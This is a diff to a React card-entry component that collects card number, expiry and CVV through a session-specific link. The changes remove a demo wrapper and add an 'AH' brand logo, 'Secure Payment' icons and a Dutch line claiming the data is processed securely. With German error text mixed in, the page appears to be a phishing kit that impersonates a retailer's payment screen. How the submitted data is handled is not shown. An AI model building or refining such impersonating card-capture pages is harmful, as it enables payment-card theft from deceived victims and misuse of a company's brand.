@@ -89,49 +89,64 @@ export function CardClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <DemoShell title="Kaartgegevens">
-        <ConfigMissing />
-      </DemoShell>
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
+          <ConfigMissing />
+        </div>
+      </div>
     );
   }
 
   if (!sessionId) {
     return (
-      <DemoShell title="Kaartgegevens">
-        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
-          Ungueltiger Link.
-        </p>
-      </DemoShell>
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
+          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+            Ungueltiger Link.
+          </p>
+        </div>
+      </div>
     );
   }
 
   return (
-    <DemoShell>
-      <div className="space-y-4 w-full mt-24 sm:mt-6">
-        <div className={ui.panel}>
-          <div className="text-center mb-6">
-            <h2 className="text-2xl font-bold text-gray-900">{settings.card_title}</h2>
-            <p className="text-sm text-gray-600 mt-1 font-medium">{settings.card_subtitle}</p>
+    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
+        
+        {/* Right Top Logo Placeholder */}
+        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
+          <img src="/ah-logo-transparent.png" alt="AH Logo" className="h-10 w-auto" id="card-ah-logo" />
+        </div>
+
+        <div className="mb-6 flex items-start gap-4">
+          <div className="mt-1 shrink-0">
+            <img src="/ah-icon-security-transparent.png" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
           </div>
-          <form onSubmit={handleSubmit} className="space-y-4">
-          <label className="block text-sm font-bold text-zinc-800">
+          <div>
+            <h2 className="text-2xl font-bold text-white mb-1">{settings.card_title}</h2>
+            <p className="text-sm text-gray-300 font-medium">{settings.card_subtitle}</p>
+          </div>
+        </div>
+
+        <form onSubmit={handleSubmit} className="space-y-4">
+          <label className="block text-sm font-medium text-white">
             {settings.card_number_label}
             <input
               required
               inputMode="numeric"
-              className={`${ui.input} tracking-widest`}
+              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
               value={number}
               onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
               autoComplete="cc-number"
             />
           </label>
           <div className="grid grid-cols-2 gap-3">
-            <label className="block text-sm font-bold text-zinc-800">
+            <label className="block text-sm font-medium text-white">
               {settings.card_expiry_label}
               <input
                 required
                 placeholder="MM/JJ"
-                className={ui.input}
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
                 value={expiry}
                 onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                 autoComplete="cc-exp"
@@ -139,13 +154,13 @@ export function CardClient({ sessionId }: Props) {
                 maxLength={5}
               />
             </label>
-            <label className="block text-sm font-bold text-zinc-800">
+            <label className="block text-sm font-medium text-white">
               {settings.card_cvv_label}
               <input
                 required
                 inputMode="numeric"
                 maxLength={4}
-                className={ui.input}
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
                 value={cvc}
                 onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                 autoComplete="cc-csc"
@@ -154,25 +169,31 @@ export function CardClient({ sessionId }: Props) {
           </div>
 
           {!expiryValid && expiry.length > 0 ? (
-            <p className="text-xs text-red-600">Ablaufdatum muss im Format MM/JJ sein.</p>
+            <p className="text-xs text-red-400">Ablaufdatum muss im Format MM/JJ sein.</p>
           ) : null}
 
           {!cvcValid && cvc.length > 0 ? (
-            <p className="text-xs text-red-600">CVV muss aus 3 oder 4 Ziffern bestehen.</p>
+            <p className="text-xs text-red-400">CVV muss aus 3 oder 4 Ziffern bestehen.</p>
           ) : null}
 
-          {msg ? <p className="text-center text-sm text-[#003b8f]">{msg}</p> : null}
+          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
 
           <button
             type="submit"
             disabled={saving || !expiryValid || !cvcValid}
-            className={ui.submit}
+            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
-            {saving ? "Sendenâ€¦" : settings.card_button}
+            {saving ? "Senden..." : settings.card_button}
           </button>
+          
+          <div className="mt-4 flex items-center justify-center gap-2">
+            <img src="/ah-icon-security-transparent.png" alt="Secure" className="h-5 w-5" />
+            <span className="text-[13px] font-medium text-gray-300">
+              Je gegevens worden veilig verwerkt.
+            </span>
+          </div>
         </form>
-        </div>
       </div>
-    </DemoShell>
+    </div>
   );
 }
